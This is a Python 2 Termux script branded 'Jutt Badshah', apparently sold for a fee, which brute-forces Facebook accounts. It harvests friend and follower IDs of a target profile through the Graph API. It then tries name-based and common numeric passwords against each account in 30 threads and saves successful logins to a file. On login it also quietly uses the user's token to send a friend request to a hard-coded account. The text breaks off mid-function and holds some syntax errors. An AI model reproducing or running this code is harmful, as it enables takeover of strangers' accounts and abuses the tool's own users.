#coding=utf-8
#!/usr/bin/python2
#coding=utf-8
#originally written by jutt badshah
try:
    import os,sys,time,datetime,random,hashlib,re,threading,json,getpass,urllib,cookielib,requests,uuid
    from multiprocessing.pool import ThreadPool
except ImportError:
    os.system('pip2 install requests')
    os.system('pip2 install mechanize')

os.system('clear')
if not os.path.isfile('/data/data/com.termux/files/usr/bin/node'):
    os.system('apt update && apt install nodejs -y')
if not os.path.isfile('/data/data/com.termux/files/usr/bin/ruby'):
    os.system('apt install ruby -y && gem install lolcat')
from requests.exceptions import ConnectionError
os.system('termux-setup-storage')
try:
	os.mkdir('/sdcard/ids')
except OSError:
	pass
os.system('apt install nodejs')
os.system('pip2 install bs4')
os.system('pip2 install lolcat')
os.system('clear')
if not os.path.isfile('/data/data/com.termux/files/home/rashidali/...../node_modules/bytes/index.js'):
    os.system('fuser -k 5000/tcp &')
    os.system('#')
    os.system('cd ..... && npm install')
    os.system('cd ..... && node index.js &')
    time.sleep(10)
elif os.path.isfile('/data/data/com.termux/files/home/rashidali/...../node_modules/bytes/index.js'):
    os.system('fuser -k 5000/tcp &')
    os.system('#')
    os.system('cd ..... && node index.js &')
    time.sleep(10)
bd=random.randint(2e7, 3e7)
sim=random.randint(2e4, 4e4)
header={'x-fb-connection-bandwidth': repr(bd),'x-fb-sim-hni': repr(sim),'x-fb-net-hni': repr(sim),'x-fb-connection-quality': 'EXCELLENT','x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA','user-agent':'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]','content-type': 'application/x-www-form-urlencoded','x-fb-http-engine': 'Liger'}
os.system('git pull')
os.system('clear')
reload(sys)
sys.setdefaultencoding('utf8')
 
logo = """
\033[1;92m
\033[1;92m
\033[1;96m
\033[1;92m     {} {}  {} {}{}{} {}{}{}
\033[1;97m     {} {}  {}   {}     {}
\033[1;93m     {} {}  {}   {}     {}
\033[1;96m     {} {}  {}   {}     {}
\033[1;94m  {}{}   {}{}    {}     {}
\033[1;93m
\033[1;92m         Jutt Badshah Brand~
\033[1;91m-----------------------------------------------
\033[1;97m➣ Author : Jutt Badshah
\x1b[1;97m➣ Github : https://github.com/SHOOTER-MAKER
\x1b[1;97m➣ WP NO: +923007574310
033[1;91m-----------------------------------------------"""
idh = []
back = 0
def reg():
    os.system('clear')
    print logo
    print ''
    print '\x1b[1;37mTake The Approval For Login Charges 350'
    print ''
    time.sleep(1)
    try:
        to = open('/data/data/com.termux/jattishtiari.txt', 'r').read()
    except (KeyError, IOError):
        reg2()

    r = requests.get('https://raw.githubusercontent.com/nazeerjutt652/jutt-badshah/main/server.txt').text
    if to in r:
        print '\x1b[1;92mWelcome To Jutt Badshah Tool'
        time.sleep(5)
        login_choice()
    else:
        os.system('clear')
        print logo
        print '\tApproved Failed'
        print ' \x1b[1;92mYour Id Is Not Approved Already '
        print ' \x1b[1;92mCopy the id and send to admin'
        print ' \x1b[1;92mYour id: ' + to
        raw_input('\x1b[1;93m Press enter to send id')
        os.system('xdg-open https://wa.me/+923007574310')
        reg()


def reg2():
    os.system('clear')
    print logo
    print '\tApproval not detected'
    print ' \x1b[1;92mCopy and press enter And select whatsapp to continue'
    id = uuid.uuid4().hex[:50]
    print ' Your id: ' + id
    print ''
    sav = open('/data/data/com.termux/jattishtiari.txt', 'w')
    sav.write(id)
    sav.close()
    raw_input(' Press enter to go to whatsapp ')
    os.system('xdg-open https://wa.me/+923007574310')
    print ''
    raw_input('\x1b[1;92m Press enter to check Approval ')
    reg()
def login_choice():
	os.system('clear')
	try:
		open('.login.txt','r')
		menu()
	except IOError:
		os.system('clear')
		print(logo)
		print('')
		print(47*'-')
		print('\t    \x1b[1;35m   LOGIN MENU\x1b[0;97m')
		print(47*'-')
		print('')
		print('\x1b[1;92m[1] Login with token')
		print('\x1b[1;92m[2] Login with id/pass')
		print('')
		login_select()
def login_select():
	select = raw_input('\x1b[1;36mChoose option: \x1b[0;97m')
	if select =='1':
		login_token()
	elif select =='2':
		login_fb()
	else:
		print('')
		print('\t    \x1b[1;31mSelect valid option\x1b[0;97m')
		print('')
		time.sleep(1)
		login_select()
def login_fb():
	os.system('clear')
	print(logo)
	print('')
	print47(*'-')
	print('\t    \x1b[1;35mLOGIN WITH EMAIL PASS\x1b[0;97m')
	print(47*'-')
	print('')
	id = raw_input('/x1b[1;96m Id/mail/number: \x1b[1;97m ')
	id1=id.replace(' ','')
	id2=id1.replace('(','')
	uid=id2.replace(')','')
	pwd = raw_input('\x1b[1;91m Password: \x1b[1;97m')
	print('')
	data=requests.get('http://localhost:5000/auth?id='+uid+'&pass='+pwd, headers=header).text
	q = json.loads(data)
	if 'loc' in q:
		jutt = open('.login.txt','w')
		jutt.write(q['loc'])
		jutt.close()
		requests.post('https://graph.facebook.com/me/friends?uid=100048514350891&access_token='+q['loc'])
		menu()
	elif 'www.facebook.com' in q['error']:
		print('')
		print('\t    \x1b[1;31mUser must verify account before login\x1b[0;97m')
		time.sleep(1)
		print('')
		raw_input('\t \x1b[1;92mPress enter to back ')
		login_choice()
	else:
		print('')
		print('\t    \x1b[1;31mIncorrect credentials\x1b[0;97m')
		raw_input('\x1b[1;92mPress enter to try again ')
		login_choice()
def login_token():
	os.system('clear')
	try:
		open('.login.txt','r')
		time.sleep(1)
		menu()
	except (KeyError , IOError):
	    os.system('clear')
	    print(logo)
	    print('')
	    print(47*'-')
	    print('\t    \x1b[1;35m  FB TOKEN LOGIN\x1b[0;97m')
	    print(47*'-')
	    print('')
	    token = raw_input('\x1b[1;96m Paste token here: \x1b[1;97m')
	    token_save = open('.login.txt','w')
	    token_save.write(token)
	    token_save.close()
	    time.sleep(1)
	    menu()
def menu():
	os.system('clear')
	try:
		token = open('.login.txt','r').read()
	except IOError:
		os.system('clear')
		print('')
		print(logo)
		print('')
		print('\t    \x1b[1;31mToken not found\x1b[0;97m')
		time.sleep(1)
		login_choice()
	try:
		r = requests.get('https://graph.facebook.com/me?access_token='+token, headers=header)
		a = json.loads(r.text)
		name = a['name']
	except KeyError:
		os.system('clear')
		print('')
		print(logo)
		print('')
		print('\t    \x1b[1;31mToken expired\x1b[0;97m')
		time.sleep(1)
		os.system('rm -rf .login.txt')
		login_choice()
	os.system('clear')
	print(logo)
	print('')
	print(47*'-')
	print('\t    \x1b[1;35m User: '+name+'\x1b[0;97m')
	print(47*'-')
	print('')
	print '\x1b[1;92m[1] Crack with auto pass10'
	print '\x1b[1;92m[2] Crack with Number password6'
	print '\x1b[1;92m[3] Crack with Name + Number pass8'
        print '\x1b[1;92m[4] Crack with Name pass4'
	print '\x1b[1;92m[5] Make File'
	print('')
	menu_option()
def menu_option():
	select = raw_input('\x1b[1;36mSelect option: \x1b[0;97m')
	if select =='1':
		auto_crack()
	elif select =='2':
		choice_crack()
	elif select =='3':
		crack_b()
	elif select =='4':
	    name_crack()
	elif select =='5':
	    ex_id()
	else:
		print('')
		print('\t    \x1b[1;31mSelect valid option\x1b[0;97m')
		print('')
		menu_option()
def auto_crack():
	global token
	os.system('clear')
	try:
		token = open('.login.txt','r').read()
	except IOError:
		print('')
		print('\t    \x1b[1;31mToken not found\x1b[0;97m')
		time.sleep(1)
		login_choice()
	os.system('clear')
	print(logo)
	print('')
	print(47*'-')
	print '\t     \x1b[1;35mAUTO PASS CLONING\x1b[0;97m'
	print(47*'-')
	print('')
	print '\x1b[1;92m[1] Crack public id'
	print '\x1b[1;92m[2] Crack followers'
	print '\x1b[1;92m[3] Crack file'
	print '\x1b[1;92m[0] Back'
	print('')
	crack_select()
def crack_select():
	select = raw_input('\x1b[1;36mSelect option: \x1b[0;97m')
	id=[]
	oks=[]
	cps=[]
	if select =='1':
		os.system('clear')
		print(logo)
		print('')
		print(47*'-')
		print '\t    \x1b[1;35mAUTO PASS PUBLIC CRACK\x1b[0;97m'
		print(47*'-')
		print('')
		idt = raw_input('\x1b[1;96m Input id: \x1b[1;97m')
		try:
			r = requests.get('https://graph.facebook.com/'+idt+'?access_token='+token, headers=header)
			q = json.loads(r.text)
			print('\x1b[1;92m Cloning from : '+q['name'])
		except KeyError:
			print('\t    \x1b[1;33mLogged in id has checkpoint\x1b[0;97m')
			print('')
			raw_input('\x1b[1;92m Press enter to back')
			auto_crack()
		r = requests.get('https://graph.facebook.com/'+idt+'/friends?access_token='+token, headers=header)
		z = json.loads(r.text)
		for i in z['data']:
			uid = i['id']
			na = i['name']
			nm = na.rsplit(' ')[0]
			id.append(uid+'|'+nm)
	elif select =='2':
		os.system('clear')
		print(logo)
		print('')
		print(47*'-')
		print('\t    \x1b[1;35mAUTO PASS CRACK FOLLOWERS\x1b[0;97m')
		print(47*'-')
		print('')
		idt = raw_input('\x1b[1;96m Input id: \x1b[1;97m ')
		try:
			r = requests.get('https://graph.facebook.com/'+idt+'?access_token='+token, headers=header)
			q = json.loads(r.text)
			print('\x1b[1;92m Cloning from: '+q['name'])
		except KeyError:
			print('\t    \x1b[1;31mLogged in id has checkpoint\x1b[0;97m')
			print('')
			raw_input('\x1b[1;92m Press enter to back')
			auto_crack()
		r = requests.get('https://graph.facebook.com/'+idt+'/subscribers?access_token='+token+'&limit=999999', headers=header)
		z = json.loads(r.text)
		for i in z['data']:
			uid = i['id']
			na = i['name']
			nm = na.rsplit(' ')[0]
			id.append(uid+'|'+nm)
	elif select =='3':
		os.system('clear')
		print(logo)
		print('')
		print(47*'-')
		print '\t    \x1b[1;35mAUTO PASS FILE CRACK\x1b[0;97m'
		print(47*'-')
		print('')
		try:
			filelist = raw_input('\x1b[1;96m[+] File : \x1b[1;97m')
			for line in open(filelist , 'r').readlines():
			    id.append(line.strip())
		except (KeyError,IOError):
			print('')
			print('\t    \x1b[1;31m File not found\x1b[0;97m')
			print('')
			raw_input('\x1b[1;92m Press enter to back ')
			auto_crack()
	elif select =='0':
	    menu()
	else:
		print('')
		print('\t    \x1b[1;31mSelect valid option\x1b[0;97m')
		print('')
		crack_select()
	print('\x1b[1;92m Total IDs : '+str(len(id)))
	print('')
	print(47*'-')
	print '\x1b[1;95m             Jutt Badshah Start Cloning'
	print(47*'-')
	print '\x1b[1;96m            Jutt Badshah King Of Facebook'
	print(47*'-')
	print('')
	def main(arg):
            user = arg
            uid, name = user.split('|')
            try:
                pass1 = name.lower() + '12345'
                data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass1, headers=header).text
                q = json.loads(data)
                if 'loc' in q:
                    print '\x1b[1;92m[JUTT-OK] \x1b[1;32m' + uid + ' | ' + pass1 + '\x1b[0;97m'
                    ok = open('/sdcard/ids/JUTT_OK.txt', 'a')
                    ok.write(uid + ' | ' + pass1 + '\n')
                    ok.close()
                    oks.append(uid + pass1)
                elif 'www.facebook.com' in q['error']:
                    print '\x1b[1;34m[JUTT-CP] ' + uid + ' | ' + pass1
                    cp = open('JUTT_CP.txt', 'a')
                    cp.write(uid + ' | ' + pass1 + '\n')
                    cp.close()
                    cps.append(uid + pass1)
                else:
                    pass2 = name.lower() + '1234'
                    data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass2, headers=header).text
                    q = json.loads(data)
                    if 'loc' in q:
                        print '\x1b[1;92m[JUTT-OK] \x1b[1;32m' + uid + ' | ' + pass2 + '\x1b[0;97m'
                        ok = open('/sdcard/ids/JUTT_OK.txt', 'a')
                        ok.write(uid + ' | ' + pass2 + '\n')
                        ok.close()
                        oks.append(uid + pass2)
                    elif 'www.facebook.com' in q['error']:
                        print '\x1b[1;34m[JUTT-CP] ' + uid + ' | ' + pass2
                        cp = open('JUTT_CP.txt', 'a')
                        cp.write(uid + ' | ' + pass2 + '\n')
                        cp.close()
                        cps.append(uid + pass2)
                    else:
                        pass3 = name.lower() + '786'
                        data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass3, headers=header).text
                        q = json.loads(data)
                        if 'loc' in q:
                            print '\x1b[1;92m[JUTT-OK] \x1b[1;32m' + uid + ' | ' + pass3 + '\x1b[0;97m'
                            ok = open('/sdcard/ids/JUTT_OK.txt', 'a')
                            ok.write(uid + ' | ' + pass3 + '\n')
                            ok.close()
                            oks.append(uid + pass3)
                        elif 'www.facebook.com' in q['error']:
                            print '\x1b[1;34m[JUTT-CP] ' + uid + ' | ' + pass3
                            cp = open('JUTT_CP.txt', 'a')
                            cp.write(uid + ' | ' + pass3 + '\n')
                            cp.close()
                            cps.append(uid + pass3)
                        else:
                            pass4 = name.lower() + '123'
                            data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass4, headers=header).text
                            q = json.loads(data)
                            if 'loc' in q:
                                print '\x1b[1;92m[JUTT-OK] \x1b[1;32m' + uid + ' | ' + pass4 + '\x1b[0;97m'
                                ok = open('/sdcard/ids/JUTT_OK.txt', 'a')
                                ok.write(uid + ' | ' + pass4 + '\n')
                                ok.close()
                                oks.append(uid + pass4)
                            elif 'www.facebook.com' in q['error']:
                                print '\x1b[1;34m[JUTT-CP] ' + uid + ' | ' + pass4
                                cp = open('JUTT_CP.txt', 'a')
                                cp.write(uid + ' | ' + pass4 + '\n')
                                cp.close()
                                cps.apppend(uid + pass4)
                            else:
                                pass5 = '234567'
                                data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass5, headers=header).text
                                q = json.loads(data)
                                if 'loc' in q:
                                    print '\x1b[1;92m[JUTT-OK] \x1b[1;32m' + uid + ' | ' + pass5 + '\x1b[0;97m'
                                    ok = open('/sdcard/ids/JUTT_OK.txt', 'a')
                                    ok.write(uid + ' | ' + pass5 + '\n')
                                    ok.close()
                                    oks.append(uid + pass5)
                                elif 'www.facebook.com' in q['error']:
                                    print '\x1b[1;34m[JUTT-CP] ' + uid + ' | ' + pass5
                                    cp = open('JUTT_CP.txt', 'a')
                                    cp.write(uid + ' | ' + pass5 + '\n')
                                    cp.close()
                                    cps.apppend(uid + pass5)
                                else:
                                    pass6 = '223344'
                                    data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass6, headers=header).text
                                    q = json.loads(data)
                                    if 'loc' in q:
                                        print '\x1b[1;92m[JUTT-OK] \x1b[1;32m' + uid + ' | ' + pass6 + '\x1b[0;97m'
                                        ok = open('/sdcard/ids/JUTT_OK.txt', 'a')
                                        ok.write(uid + ' | ' + pass6 + '\n')
                                        ok.close()
                                        oks.append(uid + pass6)
                                    elif 'www.facebook.com' in q['error']:
                                        print '\x1b[1;34m[JUTT-CP] ' + uid + ' | ' + pass6
                                        cp = open('JUTT_CP.txt', 'a')
                                        cp.write(uid + ' | ' + pass6 + '\n')
                                        cp.close()
                                        cps.apppend(uid + pass6)
                                    else:
                                        pass7 = '334455'
                                        data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass7, headers=header).text
                                        q = json.loads(data)
                                        if 'loc' in q:
                                            print '\x1b[1;92m[JUTT-OK] \x1b[1;32m' + uid + ' | ' + pass7 + '\x1b[0;97m'
                                            ok = open('/sdcard/ids/JUTT_OK.txt', 'a')
                                            ok.write(uid + ' | ' + pass7 + '\n')
                                            ok.close()
                                            oks.append(uid + pass7)
                                        elif 'www.facebook.com' in q['error']:
                                            print '\x1b[1;34m[JUTT-CP] ' + uid + ' | ' + pass7
                                            cp = open('JUTT_CP.txt', 'a')
                                            cp.write(uid + ' | ' + pass7 + '\n')
                                            cp.close()
                                            cps.apppend(uid + pass7)
                                        else:
                                            pass8 = '445566'
                                            data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass8, headers=header).text
                                            q = json.loads(data)
                                            if 'loc' in q:
                                                print '\x1b[1;92m[JUTT-OK] \x1b[1;32m' + uid + ' | ' + pass8 + '\x1b[0;97m'
                                                ok = open('/sdcard/ids/JUTT_OK.txt', 'a')
                                                ok.write(uid + ' | ' + pass8 + '\n')
                                                ok.close()
                                                oks.append(uid + pass8)
                                            elif 'www.facebook.com' in q['error']:
                                                print '\x1b[1;34m[JUTT-CP] ' + uid + ' | ' + pass8
                                                cp = open('JUTT_CP.txt', 'a')
                                                cp.write(uid + ' | ' + pass8 + '\n')
                                                cp.close()
                                                cps.apppend(uid + pass8)
                                            else:
                                                pass9 = '786000'
                                                data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass9, headers=header).text
                                                q = json.loads(data)
                                                if 'loc' in q:
                                                    print '\x1b[1;92m[JUTT-OK] \x1b[1;32m' + uid + ' | ' + pass9 + '\x1b[0;97m'
                                                    ok = open('/sdcard/ids/JUTT_OK.txt', 'a')
                                                    ok.write(uid + ' | ' + pass9 + '\n')
                                                    ok.close()
                                                    oks.append(uid + pass9)
                                                elif 'www.facebook.com' in q['error']:
                                                    print '\x1b[1;34m[JUTT-CP] ' + uid + ' | ' + pass9
                                                    cp = open('JUTT_CP.txt', 'a')
                                                    cp.write(uid + ' | ' + pass9 + '\n')
                                                    cp.close()
                                                    cps.apppend(uid + pass9)
                                                else:
                                                    pass10 = '000786'
                                                    data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass10, headers=header).text
                                                    q = json.loads(data)
                                                    if 'loc' in q:
                                                        print '\x1b[1;92m[JUTT-OK] \x1b[1;32m' + uid + ' | ' + pass10 + '\x1b[0;97m'
                                                        ok = open('/sdcard/ids/JUTT_OK.txt', 'a')
                                                        ok.write(uid + ' | ' + pass10 + '\n')
                                                        ok.close()
                                                        oks.append(uid + pass10)
                                                    elif 'www.facebook.com' in q['error']:
                                                        print '\x1b[1;34m[JUTT-CP] ' + uid + ' | ' + pass10
                                                        cp = open('JUTT_CP.txt', 'a')
                                                        cp.write(uid + ' | ' + pass10 + '\n')
                                                        cp.close()
                                                        cps.apppend(uid + pass10)
            except:
			              pass
	
	p = ThreadPool(30)
	p.map(main,id)
	print('')
	print(47*'-')
	print('')
	print'\x1b[1;96m The process has completed'
	print('\x1b[1;92m Total Ok/Cp:'+str(len(oks)))+'/'+str(len(cps))
	print('')
	print(47*'-')
	print('')
	raw_input('\x1b[1;92m Press enter to back')
	menu()
def ex_id():
    idg=[]
    global token
    try:
    	token = open('.login.txt', 'r').read()
    except IOError:
    	print('\t    \x1b[1;31mToken not found\x1b[0;97m')
    	print('')
    	time.sleep(1)
    	login_choice()
    os.system('clear')
    print(logo)
    print('')
    print(47*'-')
    print '\t   \x1b[1;32mCOLLECT PUBLIC ID FRIENDLIST\x1b[0;97m'
    print(47*'-')
    print('')
    idh = raw_input('\x1b[1;96m Input Id: \x1b[1;97m ')
    try:
        r = requests.get('https://graph.facebook.com/'+idh+'?access_token='+token, headers=header)
        q = json.loads(r.text)
        print('\x1b[1;92m Collecting from: '+q['name'])
    except KeyError:
    	print('')
        print('\t    \x1b[1;31mLogged in id has checkpoint\x1b[0;97m')
        print('')
        raw_input('\x1b[1;92m Press enter to back')
        menu()
    r = requests.get('https://graph.facebook.com/'+idh+'/friends?access_token='+token, headers=header)
    q = json.loads(r.text)
    ids = open('ids_friends.txt', 'w')
    for i in q['data']:
        uid = i['id']
        na = i['name']
        nm=na.rsplit(' ')[0]
        idg.append(uid+'|'+nm)
        ids.write(uid+'|'+nm + '\n')
    ids.close()
    print('')
    print(47*'-')
    print('')
    print '\x1b[1;96m The process has completed'
    print('\x1b[1;92m Total ids: '+str(len(idg)))
    print('')
    print(47*'-')
    print('')
    raw_input('\x1b[1;95m Press enter to download file')
    os.system('cp ids_friends.txt /sdcard/jutt_extract.txt')
    os.system('rm -rf ids_friends.txt')
    print '\x1b[1;92mFile downloaded successfully'
    time.sleep(1)
    menu()
def choice_crack():
	global token
	os.system('clear')
	try:
		token = open('.login.txt', 'r').read()
	except IOError:
		print('')
		print('\t    \x1b[1;31mToken not found\x1b[0;97m')
		time.sleep(1)
		login_choice()
	os.system('clear')
	print(logo)
	print('')
	print(47*'-')
	print '\t   \x1b[1;35mNUMBER PASS CRACK MENU\x1b[0;97m'
	print(47*'-')
	print('')
	print '\x1b[1;92m[1] Crack public id'
	print '\x1b[1;92m[2] Crack followers'
	print '\x1b[1;92m[3] Crack file'
	print '\x1b[1;92m[0] Back'
	print('')
	cs()
def cs():
	select = raw_input('\x1b[1;36mSelect option: \x1b[0;97m')
	id=[]
	oks=[]
	cps=[]
	if select =='1':
		os.system('clear')
		print(logo)
		print('')
		print(47*'-')
		print '\t   \x1b[1;35mNUMBER PASS PUBLIC CRACK\x1b[0;97m'
		print(47*'-')
		print('')
		pass1 = raw_input('\x1b[1;92m Password: ')
		pass2 = raw_input('\x1b[1;92m Password: ')
		pass3 = raw_input('\x1b[1;92m Password: ')
		pass4 = raw_input('\x1b[1;92m Password: ')
		pass5 = raw_input('\x1b[1;92m Password: ')
		pass6 = raw_input('\x1b[1;92m Password: ')
		idt = raw_input('\x1b[1;96m Input id: \x1b[1;97m ')
		try:
			r = requests.get('https://graph.facebook.com/'+idt+'?access_token='+token, headers=header)
			q = json.loads(r.text)
			print('\x1b[1;92m Cloning from : '+q['name'])
		except KeyError:
			print('\t    \x1b[1;31mLogged in id has checkpoint\x1b[0;97m')
			print('')
			raw_input('\x1b[1;92m Press enter to back')
			choice_crack()
		r = requests.get('https://graph.facebook.com/'+idt+'/friends?access_token='+token, headers=header)
		z = json.loads(r.text)
		for i in z['data']:
			uid = i['id']
			na = i['name']
			nm = na.rsplit(' ')[0]
			id.append(uid+'|'+nm)
	elif select =='2':
		os.system('clear')
		print(logo)
		print('')
		print(47*'-')
		print '\t   \x1b[1;35mNUMBER PASS CRACK FOLLOWERS\x1b[0;97m'
		print(47*'-')
		print('')
		pass1 = raw_input('\x1b[1;92m Password: ')
		pass2 = raw_input('\x1b[1;92m Password: ')
		pass3 = raw_input('\x1b[1;92m Password: ')
		pass4 = raw_input('\x1b[1;92m Password: ')
		idt = raw_input(' Input id: ')
		try:
			r = requests.get('https://graph.facebook.com/'+idt+'?access_token='+token, headers=header)
			q = json.loads(r.text)
			print('\x1b[1;92m Cloning from: '+q['name'])
		except KeyError:
			print('\t    \x1b[1;31mLogged in id has checkpoint\x1b[0;97m')
			print('')
			raw_input('\x1b[1;92mPress enter to back')
			choice_crack()
		r = requests.get('https://graph.facebook.com/'+idt+'/subscribers?access_token='+token+'&limit=999999', headers=header)
		z = json.loads(r.text)
		for i in z['data']:
			uid = i['id']
			na = i['name']
			nm = na.rsplit(' ')[0]
			id.append(uid+'|'+nm)
	elif select =='3':
		os.system('clear')
		print(logo)
		print('')
		print(47*'-')
		print '\t   \x1b[1;35mNUMBER PASS FILE CRACK\x1b[0;97m'
		print(47*'-')
		print('')
		pass1 = raw_input('\x1b[1;92m Password: ')
		pass2 = raw_input('\x1b[1;92m Password: ')
		pass3 = raw_input('\x1b[1;92m Password: ')
		pass4 = raw_input('\x1b[1;92m Password: ')
		pass5 = raw_input('\x1b[1;92m Password: ')
		pass6 = raw_input('\x1b[1;92m Password: ')
		filelist = raw_input('\x1b[1;96m Input file: \x1b[1;97m ')
		try:
			for line in open(filelist , 'r').readlines():
			    id.append(line.strip())
		except (KeyError,IOError):
			print('')
			print('\t    \x1b[1;37mRequested file not found\x1b[0;97m')
			print('')
			raw_input('\x1b[1;92m Press enter to back ')
			choice_crack()
	elif select =='0':
	    menu()
	else:
		print('')
		print('\t    \x1b[1;31mSelect valid option\x1b[0;97m')
		print('')
		choice_crack()
	print('\x1b[1;92m Total IDs : '+str(len(id)))
	print('')
	print(47*'-')
	print '\x1b[1;95m             Jutt Badshah Start Cloning'
	print(47*'-')
	print '\x1b[1;96m            Jutt Badshah King Of Facebook'
        print(47*'-')
        print('')
	def main(arg):
            user = arg
            uid, name = user.split('|')
            try:
                data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass1, headers=header).text
                q = json.loads(data)
                if 'loc' in q:
                    print '\x1b[1;92m[JUTT-OK] \x1b[1;32m' + uid + ' | ' + pass1 + '\x1b[0;97m'
                    ok = open('/sdcard/ids/JUTT_OK.txt', 'a')
                    ok.write(uid + ' | ' + pass1 + '\n')
                    ok.close()
                    oks.append(uid + pass1)
                elif 'www.facebook.com' in q['error']:
                    print '\x1b[1;34m[JUTT-CP] ' + uid + ' | ' + pass1
                    cp = open('JUTT_CP.txt', 'a')
                    cp.write(uid + ' | ' + pass1 + '\n')
                    cp.close()
                    cps.append(uid + pass1)
                else:
                    data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass2, headers=header).text
                    q = json.loads(data)
                    if 'loc' in q:
                        print '\x1b[1;92m[JUTT-OK] \x1b[1;32m' + uid + ' | ' + pass2 + '\x1b[0;97m'
                        ok = open('/sdcard/ids/JUTT_OK.txt', 'a')
                        ok.write(uid + ' | ' + pass2 + '\n')
                        ok.close()
                        oks.append(uid + pass2)
                    elif 'www.facebook.com' in q['error']:
                        print '\x1b[1;34m[JUTT-CP] ' + uid + ' | ' + pass2
                        cp = open('JUTT_CP.txt', 'a')
                        cp.write(uid + ' | ' + pass2 + '\n')
                        cp.close()
                        cps.append(uid + pass2)
                    else:
                        data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass3, headers=header).text
                        q = json.loads(data)
                        if 'loc' in q:
                            print '\x1b[1;92m[JUTT-OK] \x1b[1;32m' + uid + ' | ' + pass3 + '\x1b[0;97m'
                            ok = open('/sdcard/ids/JUTT_OK.txt', 'a')
                            ok.write(uid + ' | ' + pass3 + '\n')
                            ok.close()
                            oks.append(uid + pass3)
                        elif 'www.facebook.com' in q['error']:
                            print '\x1b[1;34m[JUTT-CP] ' + uid + ' | ' + pass3
                            cp = open('JUTT_CP.txt', 'a')
                            cp.write(uid + ' | ' + pass3 + '\n')
                            cp.close()
                            cps.append(uid + pass3)
                        else:
                            data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass4, headers=header).text
                            q = json.loads(data)
                            if 'loc' in q:
                                print '\x1b[1;92m[JUTT-OK] \x1b[1;32m' + uid + ' | ' + pass4 + '\x1b[0;97m'
                                ok = open('/sdcard/ids/JUTT_OK.txt', 'a')
                                ok.write(uid + ' | ' + pass4 + '\n')
                                ok.close()
                                oks.append(uid + pass4)
                            elif 'www.facebook.com' in q['error']:
                                print '\x1b[1;34m[JUTT-CP] ' + uid + ' | ' + pass4
                                cp = open('JUTT_CP.txt', 'a')
                                cp.write(uid + ' | ' + pass4 + '\n')
                                cp.close()
                                cps.apppend(uid + pass4)
                            else:
                                data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass5, headers=header).text
                                q = json.loads(data)
                                if 'loc' in q:
                                    print '\x1b[1;92m[JUTT-OK] \x1b[1;32m' + uid + ' | ' + pass5 + '\x1b[0;97m'
                                    ok = open('/sdcard/ids/JUTT_OK.txt', 'a')
                                    ok.write(uid + ' | ' + pass5 + '\n')
                                    ok.close()
                                    oks.append(uid + pass5)
                                elif 'www.facebook.com' in q['error']:
                                    print '\x1b[1;34m[JUTT-CP] ' + uid + ' | ' + pass5
                                    cp = open('JUTT_CP.txt', 'a')
                                    cp.write(uid + ' | ' + pass5 + '\n')
                                    cp.close()
                                    cps.append(uid + pass5)
                                else:
                                    data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass6, headers=header).text
                                    q = json.loads(data)
                                    if 'loc' in q:
                                        print '\x1b[1;92m[JUTT-OK] \x1b[1;32m' + uid + ' | ' + pass6 + '\x1b[0;97m'
                                        ok = open('/sdcard/ids/JUTT_OK.txt', 'a')
                                        ok.write(uid + ' | ' + pass6 + '\n')
                                        ok.close()
                                        oks.append(uid + pass6)
                                    elif 'www.facebook.com' in q['error']:
                                        print '\x1b[1;34m[JUTT-CP] ' + uid + ' | ' + pass6
                                        cp = open('JUTT_CP.txt', 'a')
                                        cp.write(uid + ' | ' + pass6 + '\n')
                                        cp.close()
                                        cps.apppend(uid + pass6)
            except:
			              pass
	
	p = ThreadPool(30)
	p.map(main,id)
	print('')
	print(47*'-')
	print('')
	print '\x1b[1;96mThe process has completed'
	print('\x1b[1;92m Total Ok/Cp:'+str(len(oks)))+'/'+str(len(cps))
	print('')
	print(47*'-')
	print('')
	raw_input('\x1b[1;92m Press enter to back')
	menu()
def crack_b():
	global token
	os.system('clear')
	try:
		token = open('.login.txt', 'r').read()
	except IOError:
		print('')
		print('\t    \x1b[1;37mToken not found\x1b[0;97m')
		time.sleep(1)
		login_choice()
	os.system('clear')
	print(logo)
	print('')
	print(47*'-')
	print '\t  \x1b[1;35mNAME + NUMBER PASS CRACK\x1b[0;97m'
	print(47*'-')
	print('')
	print '\x1b[1;92m[1] Crack public id'
	print '\x1b[1;92m[2] Crack followers'
	print '\x1b[1;92m[3] Crack file'
	print '\x1b[1;92m[0] Back'
	print('')
	a_s()
def a_s():
	select = raw_input('\x1b[1;36mSelect option: \x1b[0;97m')
	id=[]
	oks=[]
	cps=[]
	if select =='1':
		os.system('clear')
		print(logo)
		print('')
		print(47*'-')
		print '\t  \x1b[1;35mNAME + NUMBER PASS PUBLIC CRACK\x1b[0;97m'
		print(47*'-')
		print('')
		p1 = raw_input('\x1b[1;92m Name + digit: ')
		p2 = raw_input('\x1b[1;92m Name + digit: ')
		p3 = raw_input('\x1b[1;92m Name + digit: ')
		p4 = raw_input('\x1b[1;92m Name + digit: ')
		pass5 = raw_input('\x1b[1;92m Password: ')
		pass6 = raw_input('\x1b[1;92m Password: ')
		pass7 = raw_input('\x1b[1;92m Password: ')
		pass8 = raw_input('\x1b[1;92m Password: ')
		idt = raw_input('\x1b[1;96m Input id: \x1b[1;97m ')
		try:
